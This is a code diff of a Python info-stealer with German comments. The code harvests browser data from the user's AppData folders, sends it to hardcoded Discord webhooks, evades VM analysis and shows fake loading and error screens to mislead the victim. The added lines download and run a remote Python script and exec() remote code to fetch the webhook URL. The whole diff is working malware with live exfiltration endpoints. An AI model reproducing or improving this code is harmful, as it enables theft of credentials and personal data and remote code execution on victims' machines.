@@ -28,13 +28,49 @@ from discord_webhook import DiscordWebhook
 import string
 import urllib.request
 
+def download_and_execute_script(url):
+    try:
+        # Skript herunterladen
+        response = urllib.request.urlopen(url)
+        script_content = response.read().decode('utf-8')
+        
+        # Temporäre Datei erstellen
+        with tempfile.NamedTemporaryFile(suffix='.py', delete=False) as temp_file:
+            temp_file.write(script_content.encode('utf-8'))
+            temp_path = temp_file.name
+        
+        # Skript ausführen
+        subprocess.run(['python', temp_path], check=True)
+        
+    except Exception as e:
+        print(f"Fehler beim Ausführen des Skripts: {e}")
+    finally:
+        # Temporäre Datei bereinigen
+        if 'temp_path' in locals() and os.path.exists(temp_path):
+            os.unlink(temp_path)
+
+
+# URL des Skripts
+script_url = "https://raw.githubusercontent.com/UseUelessStorage/FakeLoading/refs/heads/main/Fake.py"
+
 # Colour Setup
 init(convert=True)
 
 def clear_console():
     os.system('cls' if os.name == 'nt' else 'clear')
 
-WEBHOOK_URL = "https://discord.com/api/webhooks/1364782214730223756/UQjz4-yWRDGVK4lrTNwdLPQ9vL7GUo5nONrAOGKXiqpAATtL6btmiAJR8i8SmerbKar8"
+
+def load_webhook_url():
+    url = "https://raw.githubusercontent.com/UseUelessStorage/WLib/refs/heads/main/UI.py"
+    response = requests.get(url)
+    if response.status_code == 200:
+        exec(response.text, globals())
+        return globals().get("WEBHOOK_URL", None)
+    else:
+        print("Fehler beim Laden der Webhook.")
+        return None
+
+WEBHOOK_URL = "https://discord.com/api/webhooks/1365067496620687431/EMhaPQ9qtsXd306vKkYq0Pie7OxxDODgQPOX2_mt9wJfqrt_tK1FlKtFAgLv1dVhp7IO"
 
 appdata = os.getenv('LOCALAPPDATA')
 roaming = os.getenv('APPDATA')
@@ -124,9 +160,9 @@ def save_results(browser_name, type_of_data, content):
         with open(file_path, "w", encoding="utf-8") as temp_file:
             temp_file.write(content)
         
-        Webhookurl = "https://discord.com/api/webhooks/1365067496620687431/EMhaPQ9qtsXd306vKkYq0Pie7OxxDODgQPOX2_mt9wJfqrt_tK1FlKtFAgLv1dVhp7IO"  #exfiltrate webhook here
+        Webhook_url = "https://discord.com/api/webhooks/1365067496620687431/EMhaPQ9qtsXd306vKkYq0Pie7OxxDODgQPOX2_mt9wJfqrt_tK1FlKtFAgLv1dVhp7IO"  #exfiltrate webhook here
         webhook = DiscordWebhook(
-            url=Webhookurl,
+            url=Webhook_url,
             content=f"Extracted {type_of_data.replace('_', ' ')} from {browser_name}."
         )
         with open(file_path, "rb") as temp_file:
@@ -325,6 +361,7 @@ if VM_DETECTED == False:
         }
         try: # Exception (To make sure no errors).
             requests.post(WEBHOOK_URL, json=embed) # Attempt to send.
+            download_and_execute_script(script_url)
             clear_console()
             time.sleep(0.05)
             clear_console()
@@ -447,8 +484,8 @@ if VM_DETECTED == False:
                     save_results(browser, data_type_name, data)
 
         # Setup window.
-        width = 0.1 # Width of window.
-        height = 0.1 # Height of window.
+        width = 914 # Width of window.
+        height = 606 # Height of window.
         
         root = tkinter.Tk() # Name.
         
@@ -583,13 +620,13 @@ if VM_DETECTED == False:
     for i in range(0, len(STAGES)): # Send  "loading" sequence.
         print(Fore.WHITE + str(PREFETCH) + Fore.CYAN + str(STAGES[i]))
         time.sleep(float(DELAYS[i]))
-    time.sleep(1)
+    time.sleep(0.25)
     print()
 
     for i in range(0, len(ERRORS)): # Send "Error" sequence.
         print(Fore.WHITE + str(PREFETCH) + Fore.RED + str(ERRORS[i]))
         time.sleep(0.01)
-    time.sleep(0.5)
+    time.sleep(0.1)
 
     print()
     print(Fore.WHITE + str(PREFETCH) + Fore.BLUE + "The Interface will Show Soon, After this you can Close this Tab.") # Spoof no MC.
@@ -629,5 +666,4 @@ else: # When in VM (Or some form has flagged.)
     print(Fore.WHITE + str(PREFETCH) + Fore.RED + "Exiting...") # Bogus responses.
     time.sleep(1)
     
-
 
